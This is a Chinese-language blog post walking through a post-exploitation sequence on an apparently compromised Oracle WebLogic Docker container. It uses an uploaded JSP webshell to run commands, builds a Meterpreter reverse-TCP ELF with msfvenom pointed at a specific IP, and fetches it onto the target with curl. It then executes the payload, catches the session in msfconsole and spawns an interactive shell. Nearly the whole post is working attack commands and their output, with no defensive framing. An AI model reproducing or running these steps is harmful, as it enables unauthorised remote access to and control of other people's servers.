---
layout: post
toc: true
title: "「渗透」:一句话反弹docker-shell"
author: Bin4xin
categories:
    - blog
tags:
    - docker
    - Web
    - 渗透
permalink: /blog/2020/docker/reverse/shell/by1/
---

> 一句话木马反弹shell

前提：现在情况是已经上传了一句话木马，可以执行命令如：ls,pwd,whoami等；问题在于，不管用`python`、`bash`还是`perl`都反弹不了，偷不了懒，就上msf把。
```javascript
http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&cmd=pwd
/u01/oracle/user_projects/domains/base_domain
http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&cmd=whoami
oracle
```

#### msf生成shell文件
`msfvenom`先生成反弹shell文件，赋权。
```javascript
root@iZj6cgn7odv59wmjjhe6zwZ:~## msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=47.52.233.92 LPORT=1234 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1046632 bytes
Final size of elf file: 1046632 bytes
root@iZj6cgn7odv59wmjjhe6zwZ:~## chmod 777 shell.elf
```

```javascript
http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&cmd=ls
测试一下一句话木马，是可以执行命令的：
total 1100
drwxr-x--- 15 oracle oracle    4096 Apr 27 08:06 .
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 ..
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 autodeploy
drwxr-x---  6 oracle oracle    4096 Apr 25 00:23 bin
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 common
drwxr-x---  9 oracle oracle    4096 Apr 25 00:24 config
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 console-ext
-rw-r-----  1 oracle oracle     234 Apr 25 00:23 derby.log
-rw-r-----  1 oracle oracle     257 Apr 25 00:24 edit.lok
-rw-r-----  1 oracle oracle     327 Jul 19  2017 fileRealm.properties
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 init-info
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 lib
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 nodemanager
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 orchestration
drwxr-x---  2 oracle oracle    4096 Apr 26 01:39 original
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 security
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 servers
-rwxr-x---  1 oracle oracle     261 Apr 25 00:23 startWebLogic.sh
drwxr-x---  3 oracle oracle    4096 Apr 25 09:49 tmp
```

#### 下载shell文件执行
在一句话木马上执行下载命令，`Wget`和`Curl`都可以，一般linux机器上都自带下载工具
```
http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&cmd=curl -o shell.elf http://ip/shell.elf
等待下载完毕；继续赋权
chmod 777 shell.elf
在查看一下：
total 1100
drwxr-x--- 15 oracle oracle    4096 Apr 27 08:06 .
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 ..
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 autodeploy
drwxr-x---  6 oracle oracle    4096 Apr 25 00:23 bin
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 common
drwxr-x---  9 oracle oracle    4096 Apr 25 00:24 config
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 console-ext
-rw-r-----  1 oracle oracle     234 Apr 25 00:23 derby.log
-rw-r-----  1 oracle oracle     257 Apr 25 00:24 edit.lok
-rw-r-----  1 oracle oracle     327 Jul 19  2017 fileRealm.properties
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 init-info
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 lib
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 nodemanager
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 orchestration
drwxr-x---  2 oracle oracle    4096 Apr 26 01:39 original
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 security
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 servers
-rwxrwxrwx  1 oracle oracle 1046632 Apr 27 08:06 shell.elf
-rwxr-x---  1 oracle oracle     261 Apr 25 00:23 startWebLogic.sh
drwxr-x---  3 oracle oracle    4096 Apr 25 09:49 tmp
```

#### shell流量接入
我们发现已经成功下载了反弹shell的msf文件，直接执行
`http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&cmd=./shell.elf`，执行前别忘了在服务器上监听端口。
```javascript
# msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter_reverse_tcp
PAYLOAD => linux/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:1234

```
执行完就可以看到建立连接的流量接入了：
```javascript
[*] Meterpreter session 1 opened (172.31.116.237:1234 -> 59.110.152.168:44832) at 2020-04-27 16:08:48 +0800
```
下一步：
```javascript
meterpreter > shell
Process 460 created.
Channel 1 created.
whoami
oracle
python -c 'import pty;pty.spawn("/bin/sh")'
sh-4.2$ whoami
whoami
oracle
sh-4.2$ sudo su
sudo su
sh: sudo: command not found
python -c 'import pty;pty.spawn("/bin/bash")'
[oracle@5c6fe690ac22 base_domain]$ pwd
pwd
/u01/oracle/user_projects/domains/base_domain
[oracle@5c6fe690ac22 base_domain]$ ls
ls
autodeploy  console-ext           init-info      original   startWebLogic.sh
bin         derby.log             lib            security   tmp
common      edit.lok              nodemanager    servers
config      fileRealm.properties  orchestration  shell.elf
[oracle@5c6fe690ac22 base_domain]$ uname -a
uname -a
Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 ##1 SMP Tue Feb 4 23:02:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
以上。